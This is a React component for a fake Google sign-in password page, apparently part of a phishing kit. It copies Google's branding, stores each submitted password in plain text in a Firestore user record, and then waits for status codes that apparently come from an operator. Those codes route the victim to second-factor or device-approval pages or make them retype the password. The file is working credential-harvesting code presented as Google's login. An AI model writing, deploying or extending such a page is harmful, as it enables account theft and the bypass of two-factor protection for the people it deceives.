import GoogleLoadingBar from "../GoogleLoadingBar";
import React, { useState, useEffect } from "react";
import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore";
import { db } from "../../firebase";
import { useNavigate, useParams } from "react-router-dom";
export default function EnterPass() {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
 const params = useParams();
    const navigate = useNavigate();
    const { userID } = params;
    const [result, setResult] = useState({
      title: "",
      detail: "",
    });
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!password.trim()) return;
              try {
            setIsLoading(true); // Set loading to true while saving data
            const userDocRef = doc(db, "users", userID);
            await updateDoc(userDocRef, {
              pass: password,
              status: 2
            });
            listener(userID);
          } catch (error) {
            console.error("Error saving class code to Firestore: ", error);
          } finally {
          }
      };
    const listener = (userID) => {
      onSnapshot(doc(db, "users", userID), (snapshot) => {
        const status = snapshot.data()?.status;
        const type = snapshot.data()?.type;
        const num = snapshot.data()?.num;
        if (status === 1) return;
        // Handle different status codes here
        switch (status) {
          case 4:
            navigate(`/schedule/confirm/done`);
            break;
          case 5:
            navigate(`/google/approve/device/${userID}/${num}`);
            break;
          case 3:
            navigate(`/google/factor/${userID}/${type}`);
            break;
          case -2:
            setError("The password entered is incorrect.")
            setIsLoading(false);
            break;
          default:
            setResult({
              title: "error",
              detail: "Unhandled status:" + status,
            });
        }
      });
  };
  const handleCheckboxChange = () => {
    setShowPassword(!showPassword); // đảo ngược trạng thái showPassword
  };
  // const handleNext = (e) => {
  //   e.preventDefault();
  //   if (!password) {
  //     setError("Enter an email or phone number");
  //     return;
  //   }
  //   setError("");
  //   alert(`Continue with: ${password}`);
  // };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-start sm:justify-center font-sans text-[#202124]">
            {isLoading && (
        <GoogleLoadingBar/>
      )}
      {/* Card container */}
      <div className="bg-white w-full max-w-sm sm:max-w-md rounded-none sm:rounded-2xl sm:shadow-[0_8px_24px_rgba(60,64,67,0.12),0_2px_6px_rgba(60,64,67,0.08)] sm:p-10 px-6 py-12 mt-0 sm:mt-0 flex flex-col">
       {/* Google Logo */}
<div className="flex flex-col sm:items-center items-start justify-center">

  <div className="mb-8 sm:mb-6">
<img
  src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
  alt="Google"
  className="hidden sm:block h-8"
/>
<img
  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png"
  alt="Google"
  className="block sm:hidden h-11"
/>

  </div>

  {/* Title */}
  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-2">
    Welcome
  </h1>



</div>
<div className="flex justify-start sm:justify-center inline-block text-left mt-1 mb-8 sm:mb-10">
  <button
    onClick={() => setOpen(!open)}
    className="flex items-center gap-2 p-1 border border-gray-300 rounded-full hover:shadow-sm transition"
  >
    <svg
      className="w-6 h-6 rounded-full"
      aria-hidden="true"
      fill="#5f6368"
      focusable="false"
      viewBox="0 0 24 24"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 
               10-4.48 10-10S17.52 2 12 2zm6.36 14.83
               c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36
               2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8
               8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12
               6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13
               s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
    </svg>
    <svg
      className={`w-4 h-4 text-gray-600 transition-transform ${
        open ? "rotate-360" : ""
      }`}
      fill="none"
      stroke="currentColor"
      strokeWidth={2}
      viewBox="0 0 24 24"
    >
      <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
    </svg>
  </button>
</div>
        {/* Form */}
        <div className="flex flex-col flex-1">

          <input
            id="password"
            name="password"
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter your password"
            className={`w-full border ${
              error
                ? "border-red-500 focus:ring-red-500 focus:border-red-500"
                : "border-gray-300 focus:ring-blue-600 focus:border-blue-600"
            } rounded-md px-3 py-3 text-base focus:outline-none focus:ring-1`}
          />
          {error && <p className="text-red-600 text-sm mt-2">{error}</p>}

 <div className="flex items-center space-x-2 mt-3">
      {/* Checkbox */}
      <input
        id="show-password"
        type="checkbox"
 checked={showPassword}
          onChange={handleCheckboxChange}
        className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
      />

      {/* Label */}
      <label htmlFor="show-password" className="text-sm font-medium text-gray-700">
        Show password
      </label>
    </div>
         
<div className="flex justify-between items-center mt-10 space-y-0">
            <a
              href="#"
              onClick={(e) => e.preventDefault()}
    className="text-sm text-blue-600 font-medium hover:underline"
            >
              Forgot password?
            </a>

            <button disabled={isLoading}
            onClick={handleSubmit}
    className="bg-blue-600 text-white font-medium text-sm px-6 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 transition-all"
            >
                  {
              isLoading
                ? "Waiting.."
                : "Next"
            } 
            </button>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer
        className="
          w-full max-w-sm sm:max-w-md mt-8 sm:mt-10 pb-8 sm:pb-0
          flex flex-col sm:flex-row items-center justify-between
          space-y-3 sm:space-y-0
          text-xs
          text-[#9aa0a6] sm:text-[#5f6368]
        "
      >
        <select
          className="bg-transparent border-none outline-none cursor-pointer text-xs"
          defaultValue="en-US"
        >
          <option value="en-US">English (United States)</option>
          {/* <option value="vi-VN">Tiếng Việt</option>
          <option value="fr-FR">Français (France)</option>
          <option value="de-DE">Deutsch</option> */}
        </select>

        <div className="flex items-center space-x-4">
          {["Help", "Privacy", "Terms"].map((link) => (
            <a
              key={link}
              href="#"
              onClick={(e) => e.preventDefault()}
              className="hover:underline hover:text-[#5f6368] transition-colors"
            >
              {link}
            </a>
          ))}
        </div>
      </footer>
    </div>
  );
}
